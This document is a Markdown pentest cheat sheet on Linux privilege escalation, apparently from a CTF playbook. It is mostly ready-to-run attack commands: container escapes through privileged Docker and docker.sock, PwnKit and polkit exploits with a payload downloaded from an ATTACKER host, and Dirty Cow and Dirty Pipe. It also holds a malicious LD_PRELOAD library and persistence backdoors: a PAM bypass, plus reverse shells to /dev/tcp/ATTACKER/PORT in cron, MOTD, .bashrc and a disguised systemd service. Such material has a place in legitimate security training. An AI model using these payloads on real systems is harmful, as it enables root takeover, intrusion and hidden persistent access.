# Linux Privilege Escalation — Extended

Supplements `PENTEST.md § Privilege Escalation`. Covers container escape,
polkit/DBUS CVEs, kernel exploits, LD_PRELOAD abuse, and persistence techniques.

---

## 1. Container Escape

### Are You In a Container?
```bash
ls /.dockerenv                          # Docker
cat /proc/1/cgroup | grep -i docker     # Docker cgroup
cat /proc/1/cgroup | grep -i lxc        # LXC
systemd-detect-virt                     # virt type
env | grep KUBERNETES                   # K8s
hostname | grep -E '^[a-f0-9]{12}$'    # Docker container hostname
```

### Docker — Privileged Container
```bash
# Check
cat /proc/self/status | grep CapEff     # ffffffffffffffff = full caps = privileged

# Exploit: mount host disk
fdisk -l                                # find host disk (e.g., /dev/sda1)
mkdir /tmp/host && mount /dev/sda1 /tmp/host
chroot /tmp/host bash                   # now running as root in host FS
# Add SSH key, read /etc/shadow, drop cron, etc.
```

### Docker — SYS_ADMIN Capability (cgroup RCE)
```bash
# Verify: capsh --print | grep sys_admin (or check CapEff)
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "id > $host_path/output" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
cat /output   # runs on host as root
```

### Docker — Writable docker.sock
```bash
# Check
ls -la /var/run/docker.sock
find / -name docker.sock 2>/dev/null

# Exploit: launch privileged container mounting host root
docker -H unix:///var/run/docker.sock run -it --rm \
  --privileged -v /:/host \
  alpine chroot /host /bin/bash

# Or if docker binary not available, use API directly
curl --unix-socket /var/run/docker.sock http://localhost/images/json
curl --unix-socket /var/run/docker.sock \
  -X POST http://localhost/containers/create \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Cmd":["/bin/sh"],"HostConfig":{"Binds":["/:/host"],"Privileged":true}}'
```

### LXC / LXD Group
```bash
# Check group membership
id | grep lxd

# Exploit
lxc init ubuntu:18.04 privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
lxc start privesc
lxc exec privesc -- /bin/sh
# Now in container with host / at /mnt/root
chroot /mnt/root bash  # host root shell
```

If no images available:
```bash
# Build minimal image from tarball
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder && ./build-alpine
lxc image import alpine.tar.gz --alias alpine
# Then proceed as above
```

### Container Escape — Additional Vectors
- **Shared PID namespace** (`--pid=host`): `nsenter -t 1 -m -u -i -n -p -- /bin/bash`
- **Shared network namespace** (`--network=host`): access host-only services
- **Mounted host paths**: check `mount | grep host`, write to init scripts or cron
- **Docker socket via environment**: `DOCKER_HOST=tcp://...` or mounted socket

---

## 2. Polkit / DBUS

### CVE-2021-4034 — PwnKit (pkexec)
Affects virtually all Linux distros. `pkexec` mishandles argv[0] → local root.

```bash
# Check if vulnerable
pkexec --version   # 0.105 and earlier (most systems before Jan 2022 patches)

# Exploit (many public PoCs)
git clone https://github.com/berdav/CVE-2021-4034
cd CVE-2021-4034 && make && ./cve-2021-4034
# → root shell

# One-liner PoC (compile on target if gcc available)
curl https://ATTACKER/pwnkit.c -o /tmp/pwnkit.c
gcc /tmp/pwnkit.c -o /tmp/pwnkit && /tmp/pwnkit
```

### CVE-2021-3560 — polkit DBUS Race (Ubuntu 20.04, RHEL 8)
```bash
# Race condition: kill dbus-send at ~0.004s
bash -c 'dbus-send --system --dest=org.freedesktop.Accounts \
  --type=method_call --print-reply \
  /org/freedesktop/Accounts \
  org.freedesktop.Accounts.CreateUser \
  string:hacked string:hacked int32:1 &'; sleep 0.005s; kill %%

# Timing varies — try 10–100 times with different sleep values
for i in $(seq 1 100); do
  bash -c 'dbus-send ... &'; sleep 0.00$(( RANDOM % 9 + 1 ))s; kill %%
done
# Check: id hacked — if uid exists, set password then su
```

---

## 3. Kernel Exploits

### Enumeration
```bash
uname -a                      # kernel version
cat /etc/os-release           # distro + version
cat /proc/version

searchsploit linux kernel $(uname -r | cut -d- -f1)
# Or: linux-exploit-suggester
./linux-exploit-suggester.sh
./linux-exploit-suggester-2.pl
```

### Dirty Cow — CVE-2016-5195
Linux 2.6.22–4.8.3. Race condition in copy-on-write.
```bash
# Compile on target
gcc -pthread dirtyc0w.c -o dirty -lcrypt && ./dirty PASSWORD
# Creates new /etc/passwd root entry, or overwrites SUID binary

# Variant: write SSH key to /root/.ssh/authorized_keys
# Variant: overwrite sudo binary
```

### Dirty Pipe — CVE-2022-0847
Linux 5.8–5.16.11. Write to arbitrary read-only files via pipe splice.
```bash
# Best use: overwrite SUID binary with shell
gcc dirtypipe.c -o dp
./dp /usr/bin/su     # creates /tmp/sh with SUID root, runs it
# Or: modify /etc/passwd to add root user

# Detection
uname -r  # 5.8–5.16.11 = vulnerable
```

### OverlayFS — CVE-2023-0386
Linux < 6.2. Unprivileged user namespace + overlay mount → setuid file execution.
```bash
# Check: unshare --user --map-root-user unshare --mount id (if works = may be vulnerable)
# PoC: https://github.com/xkaneiki/CVE-2023-0386
```

### BPF Privesc (Recent)
- CVE-2022-23222: unprivileged BPF → null ptr deref → root
- CVE-2021-3490: eBPF out-of-bounds write
```bash
# Check if unprivileged BPF enabled
cat /proc/sys/kernel/unprivileged_bpf_disabled  # 0 = enabled = potentially vulnerable
```

---

## 4. LD_PRELOAD / Library Hijacking

### sudo LD_PRELOAD
```bash
# Check
sudo -l | grep LD_PRELOAD   # "env_keep+=LD_PRELOAD"

# Malicious .so
cat > /tmp/shell.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setresuid(0,0,0);
    system("/bin/bash -p");
}
EOF
gcc -fPIC -shared -nostartfiles -o /tmp/shell.so /tmp/shell.c

# Execute
sudo LD_PRELOAD=/tmp/shell.so ANY_ALLOWED_CMD
```

### Library Path Hijacking
```bash
# Find libraries loaded by SUID binary
ldd /usr/local/bin/suidbinary

# Check writability of paths in LD_LIBRARY_PATH or /etc/ld.so.conf.d/
# If writable path comes BEFORE system path: drop malicious lib there

# RPATH abuse: binary compiled with RPATH=.
readelf -d /usr/local/bin/suidbinary | grep RPATH
# If RPATH=. → drop .so in cwd, run binary from there
```

### Shared Object Injection (Missing Library)
```bash
# strace a binary to find missing .so files
strace /usr/local/bin/binary 2>&1 | grep "No such file"
# If: open("/lib/libmissing.so.0", ...) = -1 ENOENT

# Create the missing library
gcc -fPIC -shared -o /lib/libmissing.so.0 shell.c
# Next binary execution loads our library
```

---

## 5. Persistence Techniques (Post-Root)

### PAM Backdoor
```bash
# Append to /etc/pam.d/sshd — any password accepted
echo "auth sufficient pam_permit.so" >> /etc/pam.d/sshd
# Test: ssh root@TARGET with any password
```

### MOTD / update-motd.d
```bash
# Scripts run as root on every SSH login
echo '#!/bin/bash' > /etc/update-motd.d/00-backdoor
echo 'bash -i >& /dev/tcp/ATTACKER/PORT 0>&1' >> /etc/update-motd.d/00-backdoor
chmod +x /etc/update-motd.d/00-backdoor
# Triggers on next SSH login to the box
```

### Cron (root)
```bash
echo "* * * * * root bash -i >& /dev/tcp/ATTACKER/PORT 0>&1" >> /etc/crontab
# Or drop in /etc/cron.d/
echo "* * * * * root /tmp/.sh" > /etc/cron.d/update
```

### SUID Shell
```bash
cp /bin/bash /tmp/.bash
chmod +s /tmp/.bash
# Activate: /tmp/.bash -p   (preserves root EUID)
```

### SSH Authorized Key
```bash
mkdir -p /root/.ssh
echo "ssh-rsa AAAA...PUBKEY..." >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
```

### bashrc / profile (User persistence)
```bash
echo 'bash -i >& /dev/tcp/ATTACKER/PORT 0>&1' >> ~/.bashrc
# Or for system-wide: /etc/bash_profile, /etc/profile.d/update.sh
```

### Systemd Service (Stealthy)
```bash
cat > /etc/systemd/system/update-notifier.service << 'EOF'
[Unit]
Description=Update Notifier Service
After=network.target

[Service]
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER/PORT 0>&1'
Restart=always

[Install]
WantedBy=multi-user.target
EOF
systemctl enable update-notifier
systemctl start update-notifier
```

### KotH-Specific: Flag Hold
See `methods/thm_general/koth_playbook.md` for full Linux KotH hold mechanics.
Quick hold (requires kothholder.sh):
```bash
bash ${CTF_ROOT}/scripts/kothholder.sh --target IP --interval 2 --aggressive
```
